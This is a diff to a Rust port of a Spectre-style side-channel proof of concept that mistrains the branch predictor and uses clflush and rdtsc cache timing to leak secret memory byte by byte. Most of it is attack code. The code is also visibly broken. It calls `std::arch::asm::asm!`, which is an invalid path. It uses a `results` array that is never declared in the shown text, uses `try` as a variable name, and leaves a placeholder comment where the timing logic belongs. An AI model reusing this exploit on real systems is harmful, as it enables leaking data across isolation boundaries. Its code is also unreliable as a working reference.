@@ -1,16 +1,9 @@
-#![feature(asm)]
-
 extern crate core_affinity;
-use std::arch::asm;
-use std::mem;
-use std::ptr;
-use std::sync::mpsc;
 use std::thread;
-use std::time::{Duration, Instant};
 use std::sync::atomic::{AtomicU64, Ordering};
 use rand::seq::SliceRandom;
 use rand::thread_rng;
-
+use std::arch::asm;
 
 const CACHE_HIT_THRESHOLD: u64 = 80;
 const NUM_TRIES: u64 = 1000;
@@ -28,11 +21,7 @@ fn rdtsc() -> u64 {
     let high: u32;
     let low: u32;
     unsafe {
-        asm!(
-            "rdtsc",
-            out("eax") low,
-            out("edx") high,
-        );
+        std::arch::asm::asm!("rdtsc", out("eax") low, out("edx") high);
     }
     (high as u64) << 32 | low as u64
 }
@@ -44,7 +33,7 @@ fn high_speed_timer() {
 }
 
 unsafe fn clflush(addr: *const u8) {
-    asm!("clflush [$0]", in(reg) addr);
+    std::arch::asm::asm!("clflush [$0]", in(reg) addr);
 }
 
 fn init_attack() -> (Vec<bool>, Vec<u8>) {
@@ -60,13 +49,15 @@ fn init_attack() -> (Vec<bool>, Vec<u8>) {
     (is_attack, attack_pattern)
 }
 
-fn read_memory_byte(target_idx: usize, arr1_size: usize, is_attack: Vec<bool>, arr1: &[u8], arr2: &[u8], attack_pattern: Vec<u8>,) -> String {
+fn read_memory_byte(target_idx: usize, arr1_size: usize, is_attack: Vec<bool>, arr1: &[u8], arr2: &[u8], attack_pattern: Vec<u8>) -> String {
     let mut secret = String::new();
 
     for try in (1..=NUM_TRIES).rev() {
         // Flush arr2 from cache memory
         for i in 0..256 {
-            clflush(&arr2[i * 512]);
+            unsafe {
+                clflush(&arr2[i * 512]);
+            }
         }
 
         let train_idx = (try as usize) % arr1_size;
@@ -74,7 +65,9 @@ fn read_memory_byte(target_idx: usize, arr1_size: usize, is_attack: Vec<bool>, a
 
         for i in (0..TRAINING_LOOPS).rev() {
             // Flush arr1_size from cache memory
-            clflush(&arr1_size);
+            unsafe {
+                clflush(&arr1_size as *const usize as *const u8);
+            }
 
             // Add in-between delay cycles
             for _ in 0..INBETWEEN_DELAY {
@@ -88,7 +81,7 @@ fn read_memory_byte(target_idx: usize, arr1_size: usize, is_attack: Vec<bool>, a
             };
 
             // Call the victim function with the training_x (to mistrain branch predictor) or target_x (to attack the SECRET address)
-            fetch_function(&arr1, &arr2, idx);
+            fetch_function(&arr1, &arr2, idx, &mut results);
 
             // Implement the timing attack logic here to measure cache access times for each character and update the `results` array
         }
@@ -96,7 +89,7 @@ fn read_memory_byte(target_idx: usize, arr1_size: usize, is_attack: Vec<bool>, a
         let mut most_likely_char = '?';
         for i in (0..256).rev() {
             let curr_char = attack_pattern[i as usize];
-            if results[curr_char as usize] >= LIKELY_THRESHOLD {
+            if u64::from(results[curr_char as usize]) >= LIKELY_THRESHOLD {
                 if curr_char >= 31 && curr_char <= 127 {
                     most_likely_char = curr_char as char;
                     break;
@@ -109,11 +102,9 @@ fn read_memory_byte(target_idx: usize, arr1_size: usize, is_attack: Vec<bool>, a
     secret
 }
 
-fn fetch_function(arr1: &[u8], arr2: &[u8], idx: usize) -> i32 {
+fn fetch_function(arr1: &[u8], arr2: &[u8], idx: usize, results: &mut [u32; 256]) {
     // This function simulates the behavior of the C++ `fetch_function`.
     // It returns values from the shared memory, based on the `idx`.
-
-    let mut value: i32 = -1;
 
     if idx < arr1.len() {
         // Ensure the index is within bounds of arr1_size
@@ -144,13 +135,11 @@ fn fetch_function(arr1: &[u8], arr2: &[u8], idx: usize) -> i32 {
             }
             
             if time2 - time1 <= CACHE_HIT_THRESHOLD {
-                // Cache hit, update the value
-                value = arr2[arr2_idx];
+                // Cache hit, update the results
+                results[arr2[arr2_idx] as usize] += 1;
             }
         }
     }
-
-    value
 }
 
 fn main() {
@@ -175,22 +164,3 @@ fn main() {
     // Terminate the timer thread
     timer_thread.join().unwrap();
 }
-
-/*
-
-Notes:
-
-Shared Memory Setup: In the C++ code, there is an assumption of shared memory for arr1 and arr2. 
-You need to set up shared memory correctly, making sure these arrays are in the same address space 
-and are appropriately sized.
-
-Cache Access Time Measurement: The code assumes cache access time measurement using the rdtscp and 
-clflush instructions. May need to adjust the CACHE_HIT_THRESHOLD value based on your system's 
-characteristics.
-
-High-Speed Timer: The high-speed timer mechanism may not provide precise timing. 
-Measuring cache access times in a real-world scenario can be complex and system-dependent.
-
-Testing: May need to fine-tune the cache access timing logic.
-
-*/
